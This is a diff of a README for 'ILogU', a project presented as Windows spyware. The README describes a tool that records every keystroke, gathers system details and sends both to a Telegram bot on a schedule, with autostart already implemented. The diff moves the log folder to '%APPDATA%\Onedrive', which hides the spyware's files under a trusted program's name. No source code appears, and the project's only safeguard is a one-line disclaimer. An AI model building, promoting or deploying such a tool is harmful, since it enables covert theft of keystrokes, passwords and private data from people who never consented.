@@ -5,11 +5,13 @@
 # ILogU
 
 ## Description
+
 ILogU is a spyware program for Windows designed to intercept and log user keystrokes, as well as send logs to Telegram via the Telegram API.
 
 ## Main Features
+
 - Logging of all keystrokes, including special keys and layouts.
-- Saving logs to the `keylog.txt` file in the user's directory (`%USERPROFILE%\\ILU`).
+- Saving logs to the `keylog.txt` file in the user's directory (`%APPDATA%\\Onedrive`).
 - Collecting detailed system information and saving it to `info.txt` in the same directory.
 - Sending both log and system info files to a Telegram bot at specified intervals.
 - Periodic update of system information in `info.txt`.
@@ -17,6 +19,7 @@ ILogU is a spyware program for Windows designed to intercept and log user keystr
 - Automatic creation of working folders and files.
 
 ## Project Structure
+
 - `src/main.cpp` - entry point, starts the logger, log sending thread, and system info collection thread.
 - `src/logger.cpp` - implements keystroke interception and logging to file.
 - `src/send_data.cpp` - sends files (keylog.txt, info.txt) to Telegram via WinHTTP.
@@ -25,6 +28,7 @@ ILogU is a spyware program for Windows designed to intercept and log user keystr
 - `src/resources/` - icons and resources for Windows.
 
 ## Configuration
+
 To configure and build the project, run the script: `bash build.sh`
 
 ![](resources/2.png)
@@ -52,6 +56,7 @@ To configure and build the project, run the script: `bash build.sh`
 <br />
 
 ## Project Roadmap
+
 - [ ] Cross-platform support
 - [x] Work with Windows registry and autostart
 - [x] Configurable sending interval
@@ -60,14 +65,16 @@ To configure and build the project, run the script: `bash build.sh`
 - [ ] Remote keylogger control via Telegram bot
 
 ## Dependencies and Build Notes
+
 - Requires MinGW-w64 for Windows build.
 - Uses WinAPI, WinHTTP, and WMI (COM) for system info collection.
-- Requires linking with: `-luser32 -lwinhttp -liphlpapi -lsetupapi -lole32 -loleaut32`
 - Unicode file paths and wide-character file streams are used for compatibility with non-ASCII user names and paths.
 
 ## Important
+
 - Do not use for malicious purposes. The author is not responsible for any consequences.
 - To use, you need to create a Telegram bot and find out your chat_id.
 
 ## License
+
 MI
